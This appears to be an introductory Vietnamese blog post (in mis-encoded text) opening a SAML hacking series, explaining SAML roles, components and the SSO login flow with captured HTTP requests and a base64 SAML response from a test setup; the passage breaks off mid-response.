[{"content":"ƒê√¢y l√† b√†i m·ªü ƒë·∫ßu c·ªßa series SAML Hacking m√† m√¨nh t√¨m hi·ªÉu ƒë∆∞·ª£c trong th·ªùi gian v·ª´a qua, b√†i ƒë·∫ßu ti√™n s·∫Ω gi·ªõi thi·ªáu v·ªÅ SAML v√† c√°ch th·ª©c ho·∫°t ƒë·ªông c·ªßa n√≥.\nSAML l√† g√¨? SAML (Security Assertion Markup Language) l√† m·ªôt chu·∫©n giao th·ª©c ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i trong vi·ªác truy·ªÅn t·∫£i th√¥ng tin x√°c th·ª±c v√† ph√¢n quy·ªÅn gi·ªØa c√°c h·ªá th·ªëng kh√°c nhau. ƒê∆∞·ª£c √°p d·ª•ng ch·ªß y·∫øu trong c√°c ·ª©ng d·ª•ng web, SAML cho ph√©p x√°c th·ª±c ng∆∞·ªùi d√πng v√† ƒë·ªëi t√°c b·∫±ng c√°ch s·ª≠ d·ª•ng ch·ª©ng ch·ªâ s·ªë v√† c√°c th√¥ng tin kh√°c ƒë·ªÉ x√°c nh·∫≠n danh t√≠nh.\nSAML ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i trong m√¥i tr∆∞·ªùng doanh nghi·ªáp, v·ªõi s·ª± ph·ªï bi·∫øn h∆°n so v·ªõi ti√™u chu·∫©n SSO (Single Sign-On) kh√°c nh∆∞ OIDC (OpenID Connect). Khi s·ª≠ d·ª•ng x√°c th·ª±c SAML, kh√¥ng ch·ªâ c√≥ vi·ªác x√°c th·ª±c ng∆∞·ªùi d√πng di·ªÖn ra, m√† c·∫£ th√¥ng tin thu·ªôc t√≠nh li√™n quan c≈©ng ƒë∆∞·ª£c x√°c th·ª±c. ƒêi·ªÅu n√†y cho ph√©p ki·ªÉm so√°t ph·∫°m vi truy c·∫≠p c·ªßa ng∆∞·ªùi d√πng d·ª±a tr√™n c√°c thu·ªôc t√≠nh ƒë√£ x√°c th·ª±c. Ngo√†i vi·ªác gi√∫p ng∆∞·ªùi d√πng ch·ªâ c·∫ßn ƒëƒÉng nh·∫≠p m·ªôt l·∫ßn, SAML c≈©ng h·ªó tr·ª£ vi·ªác qu·∫£n l√Ω quy·ªÅn truy c·∫≠p chi ti·∫øt, cho ph√©p h·∫°n ch·∫ø quy·ªÅn truy c·∫≠p v√†o c√°c ch·ª©c nƒÉng c·ª• th·ªÉ cho c√°c ph√≤ng ban, ƒë∆°n v·ªã trong t·ªï ch·ª©c.\nDo ƒë√≥, SAML kh√¥ng ch·ªâ ƒë∆∞·ª£c s·ª≠ d·ª•ng cho m·ª•c ƒë√≠ch x√°c th·ª±c (Authentication), m√† c√≤n c√≥ kh·∫£ nƒÉng h·ªó tr·ª£ trong vi·ªác qu·∫£n l√Ω quy·ªÅn truy c·∫≠p (Authorization) cho c√°c ·ª©ng d·ª•ng.\nC√°c th√†nh ph·∫ßn c·ªßa SAML SAML entities  End users: l√† ng∆∞·ªùi c·∫ßn ƒë∆∞·ª£c x√°c th·ª±c tr∆∞·ªõc khi ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng ·ª©ng d·ª•ng. Service providers: ƒê√¢y l√† ·ª©ng d·ª•ng ho·∫∑c d·ªãch v·ª• y√™u c·∫ßu th√¥ng tin v·ªÅ ng∆∞·ªùi d√πng ƒë∆∞·ª£c x√°c th·ª±c. N√≥ s·∫Ω nh·∫≠n Assertion v√† x√°c minh t√≠nh h·ª£p l·ªá c·ªßa n√≥. Identity providers: ƒê√¢y l√† th·ª±c th·ªÉ x√°c th·ª±c ng∆∞·ªùi d√πng v√† t·∫°o ra Assertion. N√≥ s·∫Ω x√°c th·ª±c th√¥ng tin v·ªÅ ng∆∞·ªùi d√πng v√† sau ƒë√≥ t·∫°o ra Assertion ch·ª©a th√¥ng tin v·ªÅ ng∆∞·ªùi d√πng v√† g·ª≠i n√≥ ƒë·∫øn Service Provider.  SAML components  Assertion: l√† m·ªôt t√†i li·ªáu XML ch·ª©a th√¥ng tin v·ªÅ x√°c th·ª±c v√† ph√¢n quy·ªÅn. N√≥ ƒë∆∞·ª£c ph√°t h√†nh b·ªüi Issuer v√† ƒë∆∞·ª£c g·ª≠i ƒë·∫øn Service Provider. Assertion bao g·ªìm c√°c th√¥ng tin v·ªÅ Subject, c√°c quy·ªÅn v√† vai tr√≤ c·ªßa Subject, th·ªùi gian hi·ªáu l·ª±c v√† c√°c ch·ªØ k√Ω s·ªë. Protocol: l√† m·ªôt t·∫≠p h·ª£p c√°c quy t·∫Øc v√† th√¥ng tin ƒë·ªÉ cho ph√©p c√°c th·ª±c th·ªÉ SAML t∆∞∆°ng t√°c v·ªõi nhau. Giao th·ª©c SAML cung c·∫•p c√°c th·ªß t·ª•c x√°c th·ª±c, ph√¢n quy·ªÅn v√† truy·ªÅn th√¥ng gi·ªØa c√°c th·ª±c th·ªÉ. Bindings: cung c·∫•p c√°c ph∆∞∆°ng th·ª©c ƒë·ªÉ truy·ªÅn Assertion v√† c√°c th√¥ng tin kh√°c gi·ªØa Issuer v√† Service Provider. C√°c bindings ph·ªï bi·∫øn nh·∫•t bao g·ªìm HTTP Redirect, HTTP POST v√† Artifact. Profiles: cung c·∫•p c√°c quy ƒë·ªãnh v√† y√™u c·∫ßu cho vi·ªác tri·ªÉn khai c√°c giao th·ª©c v√† bindings c·ªßa SAML trong c√°c k·ªãch b·∫£n s·ª≠ d·ª•ng c·ª• th·ªÉ. C√°c profile ph·ªï bi·∫øn bao g·ªìm Single Sign-On (SSO), Single Logout (SLO) v√† Identity Provider Discovery.  SAML Flow ·ªû ƒë√¢y m√¨nh m∆∞·ª£n ·∫£nh flow SAML authentication v·ªõi Azure Active Directory ƒë·ªÉ n√≥i v·ªÅ SAML Flow.\n B∆∞·ªõc 1: Ng∆∞·ªùi d√πng m·ªü tr√¨nh duy·ªát l√™n v√† truy c·∫≠p v√†o web browser. ·ªû ƒë√¢y web browser l√† th√†nh ph·∫ßn √°m ch·ªâ c√°i m√† ng∆∞·ªùi d√πng t∆∞∆°ng t√°c tr·ª±c ti·∫øp. B∆∞·ªõc 2: Web browser g·ª≠i request y√™u c·∫ßu truy c·∫≠p v√†o source tr√™n Web App (Service Provider) B∆∞·ªõc 3: Web app (Service Provider) ki·ªÉm tra, generate SAML Authorization request v√† redirect t·ªõi Identity Provider (·ªü ƒë√¢y l√† Azure AD) B∆∞·ªõc 4: Ng∆∞·ªùi d√πng th·ª±c hi·ªán login (authenticated) v√†o Identity Provider (·ªü ƒë√¢y l√† Azure AD) B∆∞·ªõc 5: Identity Provider g·ª≠i SAML tokens ƒë·∫øn Web Browser B∆∞·ªõc 6: Web Browser th·ª±c hi·ªán chuy·ªÉn ti·∫øp SAML tokens ƒë·∫øn Service Provider B∆∞·ªõc 7: Service Provider th·ª±c hi·ªán validate SAML response v√† token, check th√†nh c√¥ng th√¨ chuy·ªÉn sang b∆∞·ªõc 8 B∆∞·ªõc 8: Sau khi validate th√†nh c√¥ng SAML response v√† token, Service Provider s·∫Ω cho ph√©p ng∆∞·ªùi d√πng truy c·∫≠p v√†o source m√† ng∆∞·ªùi d√πng ƒë√£ th·ª±c hi·ªán request tr∆∞·ªõc ƒë√≥.  ƒê·ªÉ r√µ r√†ng h∆°n v·ªÅ flow v√† nh·ªØng gi√° tr·ªã truy·ªÅn qua l·∫°i gi·ªØa End User, Service providers v√† Identity providers, m√¨nh v√≠ d·ª• nh∆∞ sau\nNg∆∞·ªùi d√πng truy c·∫≠p v√†o Service providers\n1 2 3 4 5 6 7 8 9  GET /login?next=http%3A%2F%2Flocalhost%3A5000%2F HTTP/1.1 Host: localhost:5000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: \u0026lt;cookie\u0026gt; Connection: close   Service providers s·∫Ω tr·∫£ v·ªÅ response v·ªõi options login v·ªõi SAML, ng∆∞·ªùi d√πng ti·∫øp t·ª•c click v√†o login v·ªõi SAML, l√∫c n√†y tr√¨nh duy·ªát s·∫Ω g·ª≠i 1 request ƒë·∫øn Service providers y√™u c·∫ßu login b·∫±ng SAML\n1 2 3 4 5 6 7 8 9 10  GET /saml/login?next=%2F HTTP/1.1 Host: localhost:5000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://localhost:5000/login?next=http%3A%2F%2Flocalhost%3A5000%2F Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: \u0026lt;cookie\u0026gt; Connection: close   Service providers tr·∫£ v·ªÅ 1 response y√™u c·∫ßu redirect sang Identity providers\n1 2 3 4 5 6 7 8 9 10 11  HTTP/1.0 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 1417 Location: https://dev-9lrlvyer.us.auth0.com/samlp/6Rbq6LnufpOuZ99RiWdimnQfwiDBVYtM?SAMLRequest=nZJfT8IwFMW%2FytL3sYJAoGEzIDFiQOeYGHkxZetGY9ey3hbl21uGf%2BILD7y1t%2Bf%2B7rknHUnAZGzNViastgyM91kJCcSVQ2S1JIoCd1daMSAmI8vxYk46LUx2WhmVKYF%2BG9rnGygA04Yribzxz%2FFGSbAV00um9zxjz8k8RFtjdiQIhMqo2CowpIcxDoBWInAVsaHZ%2B7XS5RsIW4Y5K6gVBnlTZ51LeoSeEOAYOdv7Q6HF%2FsB0y0KLuj1xK1NVg9sF%2FWRT9%2BfSFrtHux4OE%2F6S80o%2BFR98Olm9mgXyZtMQ8dyf3Oc2r%2FVsUE9K2d1uavcCYNlMgqHShKiDO1c%2B7vntQYq7BA8Ibq%2BRF39nNOEy57I8n8%2FmJAJyl6axHz8uU%2BStmIZmIydA0chlTJq52rtVuqLmPPFYceaLRkqYNNwcUHRJvqPgb%2FTRBiYPjj2bxkrw7HCBGaOpBO4sIS%2BIjvT%2FnzD6Ag%3D%3D Vary: Cookie Server: Werkzeug/0.16.1 Python/3.7.12 Date: Thu, 18 May 2023 04:08:01 GMT \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt;   Ng∆∞·ªùi d√πng th·ª±c hi·ªán login v√†o Identity providers v·ªõi t√†i kho·∫£n v√† m·∫≠t kh·∫©u, sau ƒë√≥ Identity providers s·∫Ω tr·∫£ v·ªÅ 1 SAMLResponse nh∆∞ sau\n1 2 3 4 5 6 7 8  HTTP/2 200 OK Date: Thu, 18 May 2023 04:13:44 GMT Content-Type: text/html; charset=utf-8 ... Set-Cookie: \u0026lt;cookie\u0026gt; Alt-Svc: h3=\u0026#34;:443\u0026#34;; ma=86400, h3-29=\u0026#34;:443\u0026#34;; ma=86400 \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Working...\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;form method=\u0026#34;post\u0026#34; name=\u0026#34;hiddenform\u0026#34; action=\u0026#34;http://localhost:5000/saml/callback?org_slug=default\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;SAMLResponse\u0026#34; value=\u0026#34;PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfMTk4MmU4NGQ2ZWQ0ZGJjNTNiZWMiICBJblJlc3BvbnNlVG89ImlkLVdYQ01qRXFHOEVzZ3BkbmZsIiAgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjMtMDUtMThUMDQ6MTM6NDQuMDIzWiIgIERlc3RpbmF0aW9uPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvc2FtbC9jYWxsYmFjaz9vcmdfc2x1Zz1kZWZhdWx0Ij48c2FtbDpJc3N1ZXIgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+dXJuOmRldi05bHJsdnllci51cy5hdXRoMC5jb208L3NhbWw6SXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBWZXJzaW9uPSIyLjAiIElEPSJfSWJCOXlIbXhRVUZEWnpOZ3Z3elBicFRPQzh4ZXZ1SG8iIElzc3VlSW5zdGFudD0iMjAyMy0wNS0xOFQwNDoxMzo0My45NzlaIj48c2FtbDpJc3N1ZXI+dXJuOmRldi05bHJsdnllci51cy5hdXRoMC5jb208L3NhbWw6SXNzdWVyPjxTaWduYXR1cmUgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxTaWduZWRJbmZvPjxDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+PFNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZHNpZy1tb3JlI3JzYS1zaGEyNTYiLz48UmVmZXJlbmNlIFVSST0iI19JYkI5eUhteFFVRkRaek5ndnd6UGJwVE9DOHhldnVIbyI+PFRyYW5zZm9ybXM+PFRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8+PFRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvVHJhbnNmb3Jtcz48RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8+PERpZ2VzdFZhbHVlPm5jVkM4N2p1ZmY0YWtBTDZPRWpVa1RGUFhYWHF1SEZzNmdxdHliOHBBNTg9PC9EaWdlc3RWYWx1ZT48L1JlZmVyZW5jZT48L1NpZ25lZEluZm8+PFNpZ25hdHVyZVZhbHVlPlExVjZtMXdkMG1UNi9VZ3o5WnhFcTF1SXMyUWRpVklCQ2YxaWEyT0RyVTdkckd6V0twdnZVUmpqNTdhdjArdFkwaU5ackk0R1FiczZOM3lIUGpsUjRNaisxaysrYVE2V01vTExHWC93TGZ3dUltckFMWnpYVkgxTUp2RGNld2tsTTM5enJQUmpHNFM4NGxMNzM3blpYTTdnWXVCK1NqdDJWOUNhamZIYW9qSE5zcjlJQWFQWlQ5c2FlYkRTNytxKzBQWGZkVWVscm9Pa1BaUExzNy8vT2M0cERUUDU4TTBmekhMVWRQQ1VFQjhZc0lpVkpnNU8rbFhyb3hDUWlHdFRVUDM0UUIrbHR0Sm9zYnBYTGFXcVNZSjJjTW1GcmhWb1Y1a0VTK01qbWt4YUt3UTMxSzJGb3NlVGcwUHJnTjU2aHQ3K0VBKzlxUUtZVFRvSTZITnhKUT09PC9TaWduYXR1cmVWYWx1ZT48S2V5SW5mbz48WDUwOURhdGE+PFg1MDlDZXJ0aWZpY2F0ZT5NSUlERFRDQ0FmV2dBd0lCQWdJSkN6TW5LaWdSWEIvYk1BMEdDU3FHU0liM0RRRUJDd1VBTUNReElqQWdCZ05WQkFNVEdXUmxkaTA1YkhKc2RubGxjaTUxY3k1aGRYUm9NQzVqYjIwd0hoY05Nakl3TnpFeU1EYzBORFEwV2hjTk16WXdNekl3TURjME5EUTBXakFrTVNJd0lBWURWUVFERXhsa1pYWXRPV3h5YkhaNVpYSXVkWE11WVhWMGFEQXVZMjl0TUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzV0lEL1hKekZHTUwrTFExZjNMbW5rd2NCNWYrQWo2bjJOYm9yL3pFaVE4TDRsN0xUMXQ4M1RMV1BWd0NnbUlOQjRjODNrNGk3amY2ZHQ1QzJBbkxZUWJZcEdPeEpiS013dUc1Nk9NUy81aVZJOElDc3QxeHlzSkZlRTJveVB4YitWbk5DZEdqcFdOM0RZUzkxNldicm9pc2s1MlE2WExEdkRleXpCeEdsUDB3dFdiMnlDYWhFNDRVQjA4TGpIOWp2c0t5UGFJUzZTUjMwb1hjMndFdUZpM0krL0RGNU9UbEFRREs1MngxVW1FeHNSL21hcGRIZEhqWHNNSWhNOWxIU3Y5SWtkVmRralFEZXZmU3lLK1poRVU1d3pUVFNqMnpEZS9laFE4T2gvMlRUdlFUczJ6Umw5b1ROdHFjTnZDblZscWxWVk9OUUZxNVg1VGlWdDc3bFFJREFRQUJvMEl3UURBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJUckdmV2hjRWJHSHdXNXNOOUhwS1dEZkU2QlFEQU9CZ05WSFE4QkFmOEVCQU1DQW9Rd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFLcGdmaFFJZU94QzVGTWlVSzdSUDJGN2p2ZlJPSlAxK1RmdnpiQXlsUC9SVzlzc0NGZXJDVDFiR2Z6YVBySjFDd3lmRTZQRlJHREVaMXFBTWRzb09iYzFHYUxCaGdlL2djTEtzYXN5U293V0ZRZ1YrT2thMWFlWWJ6OWVrajloU0M3bE5VWitKZkY0SFFuM2haL3NxYjc3WFpaeWwwWXBod1BORWN0bGZBM3I2SVJtbnZHV2V1ZFpFYllMMUI1YVNBeTBSNHI0NXFtczJGS3loM2xZRDVLa2kyRTlsMXhMZ2t2MU1OV1diYmo4RjJ0TTFNZjJKcGllY1NNbC8rQi8yQTRPcXRDclJJL2F3bWh2Zk4yNVRDL1RjSDJuQlcybHROR0ZwUFYrQTVyQnd2UzdoaTluclRmYTNjaVlYREI3c2tCSW5WaUVtWHpZZUx4cmN2bTNicVE9PC9YNTA5Q2VydGlmaWNhdGU+PC9YNTA5RGF0YT48L0tleUluZm8+PC9TaWduYXR1cmU+PHNhbWw6U3ViamVjdD48c2FtbDpOYW1lSUQgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoxLjE6bmFtZWlkLWZvcm1hdDp1bnNwZWNpZmllZCI+Z29vZ2xlLW9hdXRoMnwxMTcwNjkyNzEwMjAwNTg2NzQ0NDA8L3NhbWw6TmFtZUlEPjxzYW1sOlN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjMtMDUtMThUMDU6MTM6NDMuOTc5WiIgUmVjaXBpZW50PSJodHRwOi8vbG9jYWxob3N0OjUwMDAvc2FtbC9jYWxsYmFjaz9vcmdfc2x1Zz1kZWZhdWx0IiBJblJlc3BvbnNlVG89ImlkLVdYQ01qRXFHOEVzZ3BkbmZsIi8+PC9zYW1sOlN1YmplY3RDb25maXJtYXRpb24+PC9zYW1sOlN1YmplY3Q+PHNhbWw6Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMjMtMDUtMThUMDQ6MTM6NDMuOTc5WiIgTm90T25PckFmdGVyPSIyMDIzLTA1LTE4VDA1OjEzOjQzLjk3OVoiPjxzYW1sOkF1ZGllbmNlUmVzdHJpY3Rpb24+PHNhbWw6QXVkaWVuY2U+aHR0cDovL2xvY2FsaG9zdDo1MDAwL3NhbWwvY2FsbGJhY2s/b3JnX3NsdWc9ZGVmYXVsdDwvc2FtbDpBdWRpZW5jZT48L3NhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj48L3NhbWw6Q29uZGl0aW9ucz48c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjMtMDUtMThUMDQ6MTM6NDMuOTc5WiIgU2Vzc2lvbkluZGV4PSJfcHRNNTdOWk9YVllfRk1jdkxiZTQzYm4tQmw0OFI3X3QiPjxzYW1sOkF1dGhuQ29udGV4dD48c2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3Nlczp1bnNwZWNpZmllZDwvc2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj48L3NhbWw6QXV0aG5Db250ZXh0Pjwvc2FtbDpBdXRoblN0YXRlbWVudD48c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIj48c2FtbDpBdHRyaWJ1dGUgTmFtZT0iRmlyc3ROYW1lIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj50ZXN0PC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWU9Ikxhc3ROYW1lIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj50ZXN0PC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3VwbiI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+dGVzdEBtYWlsLmNvbTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy5hdXRoMC5jb20vaWRlbnRpdGllcy9kZWZhdWx0L3Byb3ZpZGVyIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj5nb29nbGUtb2F1dGgyPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLmF1dGgwLmNvbS9pZGVudGl0aWVzL2RlZmF1bHQvdXNlcl9pZCI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+MTE3MDY5MjExMTExMTExPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLmF1dGgwLmNvbS9pZGVudGl0aWVzL2RlZmF1bHQvY29ubmVjdGlvbiI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+Z29vZ2xlLW9hdXRoMjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy5hdXRoMC5jb20vaWRlbnRpdGllcy9kZWZhdWx0L2lzU29jaWFsIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6Ym9vbGVhbiI+dHJ1ZTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjwvc2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg==\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;RelayState\u0026#34; value=\u0026#34;\u0026#34;\u0026gt; \u0026lt;noscript\u0026gt; \u0026lt;p\u0026gt; Script is disabled. Click Submit to continue. \u0026lt;/p\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/noscript\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.setTimeout(function(){document.forms[0].submit();}, 0); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Tr√¨nh duy·ªát s·∫Ω t·ª± ƒë·ªông POST SAMLResponse v·ªÅ Service providers\n1 2 3 4 5 6 7 8  POST /saml/callback?org_slug=default HTTP/1.1 Host: localhost:5000 Content-Length: 6801 ... Cookie: \u0026lt;cookie\u0026gt; Connection: close SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfMTk4MmU4NGQ2ZWQ0ZGJjNTNiZWMiICBJblJlc3BvbnNlVG89ImlkLVdYQ01qRXFHOEVzZ3BkbmZsIiAgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjMtMDUtMThUMDQ6MTM6NDQuMDIzWiIgIERlc3RpbmF0aW9uPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvc2FtbC9jYWxsYmFjaz9vcmdfc2x1Zz1kZWZhdWx0Ij48c2FtbDpJc3N1ZXIgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BdXJuOmRldi05bHJsdnllci51cy5hdXRoMC5jb208L3NhbWw6SXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBWZXJzaW9uPSIyLjAiIElEPSJfSWJCOXlIbXhRVUZEWnpOZ3Z3elBicFRPQzh4ZXZ1SG8iIElzc3VlSW5zdGFudD0iMjAyMy0wNS0xOFQwNDoxMzo0My45NzlaIj48c2FtbDpJc3N1ZXI%2BdXJuOmRldi05bHJsdnllci51cy5hdXRoMC5jb208L3NhbWw6SXNzdWVyPjxTaWduYXR1cmUgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxTaWduZWRJbmZvPjxDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BPFNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZHNpZy1tb3JlI3JzYS1zaGEyNTYiLz48UmVmZXJlbmNlIFVSST0iI19JYkI5eUhteFFVRkRaek5ndnd6UGJwVE9DOHhldnVIbyI%2BPFRyYW5zZm9ybXM%2BPFRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPFRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvVHJhbnNmb3Jtcz48RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPERpZ2VzdFZhbHVlPm5jVkM4N2p1ZmY0YWtBTDZPRWpVa1RGUFhYWHF1SEZzNmdxdHliOHBBNTg9PC9EaWdlc3RWYWx1ZT48L1JlZmVyZW5jZT48L1NpZ25lZEluZm8%2BPFNpZ25hdHVyZVZhbHVlPlExVjZtMXdkMG1UNi9VZ3o5WnhFcTF1SXMyUWRpVklCQ2YxaWEyT0RyVTdkckd6V0twdnZVUmpqNTdhdjArdFkwaU5ackk0R1FiczZOM3lIUGpsUjRNaisxaysrYVE2V01vTExHWC93TGZ3dUltckFMWnpYVkgxTUp2RGNld2tsTTM5enJQUmpHNFM4NGxMNzM3blpYTTdnWXVCK1NqdDJWOUNhamZIYW9qSE5zcjlJQWFQWlQ5c2FlYkRTNytxKzBQWGZkVWVscm9Pa1BaUExzNy8vT2M0cERUUDU4TTBmekh